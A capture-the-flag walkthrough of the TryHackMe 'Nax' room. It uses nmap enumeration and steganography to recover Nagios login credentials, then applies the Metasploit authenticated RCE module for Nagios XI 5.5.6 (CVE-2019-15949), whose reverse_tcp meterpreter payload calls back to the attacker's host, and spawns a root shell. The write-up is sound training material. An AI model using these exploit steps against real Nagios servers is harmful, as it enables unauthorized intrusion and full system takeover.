---
published: true
title: Nax - TryHackMe Walkthrough
category: Writeup
image: 'https://imgur.com/pKaNyjo.png'
author: F3dai
---
"Identify the critical security flaw in the most powerful and trusted network monitoring software on the market, that allows a user authenticated execute remote code execution."

This is a TryHackMe box. To access this you must sign up to [https://tryhackme.com/](https://tryhackme.com/). 

**URL:** [Nax](https://www.tryhackme.com/room/nax)

**Difficulty:** Medium

**Author:** Stuxnet

## Enumeration

We are given the IP 10.10.37.186. Run an nmap scan with the following command:

<pre>nmap -A -p- -sS -o portscan 10.10.193.76</pre>

Here are the open ports:

<pre>PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 62:1d:d9:88:01:77:0a:52:bb:59:f9:da:c1:a6:e3:cd (RSA)
|   256 af:67:7d:24:e5:95:f4:44:72:d1:0c:39:8d:cc:21:15 (ECDSA)
|_  256 20:28:15:ef:13:c8:9f:b8:a7:0f:50:e6:2f:3b:1e:57 (ED25519)
25/tcp   open  smtp       Postfix smtpd
|_smtp-commands: ubuntu.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-03-23T23:42:04
|_Not valid after:  2030-03-21T23:42:04
|_ssl-date: TLS randomness does not represent time
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=192.168.85.153/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
| Not valid before: 2020-03-24T00:14:58
|_Not valid after:  2030-03-22T00:14:58
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
5667/tcp open  tcpwrapped</pre>

Let's check out port 80 on my browser:

![http](https://imgur.com/GD4ls8k.png)

<pre>		     ,+++77777++=:,                    +=                      ,,++=7++=,,
		    7~?7   +7I77 :,I777  I          77 7+77 7:        ,?777777??~,=+=~I7?,=77 I
		=7I7I~7  ,77: ++:~+777777 7     +77=7 =7I7     ,I777= 77,:~7 +?7, ~7   ~ 777?
		77+7I 777~,,=7~  ,::7=7: 7 77   77: 7 7 +77,7 I777~+777I=   =:,77,77  77 7,777,
		  = 7  ?7 , 7~,~  + 77 ?: :?777 +~77 77? I7777I7I7 777+77   =:, ?7   +7 777?
		      77 ~I == ~77=77777~: I,+77?  7  7:?7? ?7 7 7 77 ~I   7I,,?7 I77~
		       I 7=77~+77+?=:I+~77?     , I 7? 77 7   777~ +7 I+?7  +7~?777,77I
		         =77 77= +7 7777         ,7 7?7:,??7     +7    7   77??+ 7777,
		             =I, I 7+:77?         +7I7?7777 :             :7 7
		                7I7I?77 ~         +7:77,     ~         +7,::7   7
		               ,7~77?7? ?:         7+:77           77 :7777=
		                ?77 +I7+,7         7~  7,+7  ,?       ?7?~?777:
		                   I777=7777 ~     77 :  77 =7+,    I77  777
		                     +      ~?     , + 7    ,, ~I,  = ? ,
		                                    77:I+
		                                    ,7
		                                     :777
		                                        :
						Welcome to elements.
					Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr</pre>
                    
We are given some elements and a diagram of characters. At this point, I'd like to believe there is a hidden message and the elements are used as some sort of key.

Let's convert the elements to their corresponding numbers and continue from there.

![periodic table](https://imgur.com/GiMzzd8.png)

<pre>Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr
47 - 80 - 73 - 51 - 84 - 46 - 80 - 78 - 103</pre>

This looks like a string of ASCII characters, let's convert this to text. I used the following tool:

[ASCII to Text](http://www.unit-conversion.info/texttools/ascii/)

Make sure the numbers are in the right format - 3 digit codes:

<pre>047 080 073 051 084 046 080 078 103
= /PI3T.***</pre>

I check to see if this is a path on the web directory:

![Image](https://imgur.com/VWrjWuP.png)

We get an image, let's download and inspect it. I try a few commands to see if there is any steganography involved. Some possible tools for inspecting steganography are:

Strings
Steghide
Exiftool
Stegsolve
Exiv2
Binwalk
Zsteg
Foremost

And there are plenty more depending on the challenge you are facing. Since the first question of the TryHackMe challenge is "What hidden file did you find?", I will try and see if there are any hidden files in this image.

Running exiftools revealed a lot of metadata about the image such as the creator, but I had some trouble finding anything so I resorted to using online tools.

Please refer to this website for linux tools and stego web tools:

[Stego Tools](https://0xrick.github.io/lists/stego/)

I finally found a result with this website:

[https://www.bertnase.de/npiet/npiet-execute.php](https://www.bertnase.de/npiet/npiet-execute.php)

<pre>nagios*****%n3****************dY</pre>

This can be interpreted as a username and password.

Nagios is a software for "IT Infrastructure Monitoring". Website can be found here:

[https://www.nagios.com/](https://www.nagios.com/)

The directory path should be /nagios.

![/nagios](https://imgur.com/6wTrDNP.png)

The username and password don't work, let's try and use this elsewhere. No other port would work so I did some more research to nagios. Turns out, this is the URL:

<pre>http://10.10.193.76/nagiosxi/</pre>

![nagios login](https://imgur.com/G9QRayR.png)

I tried the credentials we found earlier with some luck. Please note, treat the % sign from the username and password we found earlier as a separator.

![logged in](https://imgur.com/PM4WiDk.png)

## User and Root

We can find the version of Nagios at the bottom of the page:

![Version number](https://imgur.com/B3HkRy9.png)

<pre>Nagios XI 5.5.6</pre>

I found this exploit:

[Exploit DB 48191](https://www.exploit-db.com/exploits/48191)

This is a metasploit module that uses Authenticated Remote Command Execution. I used the following command to find where the CVE module is located:

<pre>search 2019-15949</pre>

Select this module and show the options:

<pre>use exploit/linux/http/nagios_xi_authenticated_rce
options</pre>

![msf](https://imgur.com/8lYpG7m.png)

<pre>   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to NagiosXI
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME   nagiosadmin      yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port</pre>
   
   
Great, let's fill the option out. We know all of the required options.

<pre>set PASSWORD [password from earlier]
set RHOSTS [target IP]
set LHOST [TryHackMe IP] (Make sure you use the TryHackMe IP, usually on interface tun0 or similar</pre>

![options](https://imgur.com/ejSGcLy.png)

We got a shell, I like to work in shell instead of meterpreter so I executed the following commands:

<pre>shell
python -c 'import pty; pty.spawn("/bin/bash")'
id</pre>

So we are already as /root. Great, let's locate user.txt and root.txt.

I found user.txt in a user's home directory called "galand"

![user.txt](https://imgur.com/Z1G7pL3.png)

And since we are already root, we can check out the root.txt file in /root:

![root.txt](https://imgur.com/MdIXQmp.png)

This was a relatively easy box, I like boxes which have steganography because it's quite fun but our exploitation already escalated our privileges.